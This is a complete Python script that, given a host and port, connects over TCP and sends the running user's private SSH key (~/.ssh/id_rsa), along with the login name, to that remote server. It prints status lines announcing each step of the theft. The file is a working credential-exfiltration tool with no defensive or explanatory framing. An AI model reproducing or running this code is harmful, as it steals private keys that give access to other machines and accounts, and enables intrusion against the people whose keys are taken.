#!/usr/bin/python3
# This Python file uses the following encoding:utf-8
import socket
from sys import exit as ext
from time import sleep as slp
from sys import argv, platform
from os.path import expanduser
from os import path, getlogin




class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'





def help():
    print(f"\n\n{bcolors.FAIL}Usage:{bcolors.ENDC} {argv[0]} {bcolors.HEADER} [Host/IP] [PORT] {bcolors.ENDC}")
    ext(0)




def check_ssh_keys(sock, key):  
    if platform == "win32":
        user_ssh_file = str(expanduser('~') + "\\.ssh\\id_rsa")
        if path.exists(user_ssh_file) and path.isfile(user_ssh_file):
            try:
                with open(user_ssh_file, "r") as keyFile:
                    _key = keyFile.read()
                sock.send((key).encode())
                slp(3)
                username = str(getlogin())
                sock.send(username.encode())
                slp(3)
                sock.send(_key.encode())
            except Exception as err:
                ext(f"Error: {err}")
    elif platform == "linux":
        user_ssh_file = str(expanduser('~') + "/.ssh/id_rsa")
        if path.exists(user_ssh_file) and path.isfile(user_ssh_file):
            try:
                with open(user_ssh_file, "r") as keyFile:
                    _key = keyFile.read()
                sock.send((key).encode())
                slp(3)
                username = str(getlogin())
                sock.send(username.encode())
                slp(3)
                sock.send(_key.encode())
            except Exception as err:
                ext(f"Error: {err}")
    else:
        user_ssh_file = str(expanduser('~') + "/.ssh/id_rsa")
        if path.exists(user_ssh_file) and path.isfile(user_ssh_file):
            try:
                with open(user_ssh_file, "r") as keyFile:
                    _key = keyFile.read()
                sock.send((key).encode())
                slp(3)
                username = str(getlogin())
                sock.send(username.encode())
                slp(3)
                sock.send(_key.encode())
            except Exception as err:
                ext(f"Error: {err}")



def key_exchage(sock):
    global key
    key = sock.recv(1024).decode('utf-8')
    return key




def client(host, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            try:
                print(f"[+]{bcolors.OKCYAN} Connecting to {bcolors.OKBLUE}{host}{bcolors.ENDC} at {bcolors.OKBLUE}{port}{bcolors.ENDC}{bcolors.ENDC}...")
                slp(3)
                sock.connect((host, port))
                key_exchage(sock)
                print(f"[+]{bcolors.OKGREEN} Connected to {bcolors.ENDC} {bcolors.OKBLUE}{host}{bcolors.ENDC} on Port {bcolors.OKBLUE}{port}{bcolors.ENDC}")
                slp(3)
                print(f"[+]{bcolors.OKCYAN} Exchanging Security Key.{bcolors.ENDC}")
                slp(3)
                print(f"[+]{bcolors.OKGREEN} Retrieving SSH key for User {bcolors.OKCYAN}{str(getlogin())}{bcolors.ENDC}...")
                slp(3)
                print(f"[+]{bcolors.OKGREEN} Private SSH Key Retrieved{bcolors.ENDC}...")
                slp(2)
                print(f"[+]{bcolors.OKGREEN} Sending SSH Key(s) to server{bcolors.ENDC}...")
                check_ssh_keys(sock, key)
                slp(5)
                print(f"[+]{bcolors.OKGREEN} Operation Successful{bcolors.ENDC}...")
                ext(0)
            except Exception as err:
                ext(f"Error: {err}")
    except socket.error as err:
        ext("Error Occured:" + err)
    except Exception as err:
        ext(f"Error: {err}")



def main():
    host = argv[1]
    port = int(argv[2])
    client(host, port)




if __name__ == "__main__":
    args = argv
    if len(args) > 2:
        main()
    else:
    	help()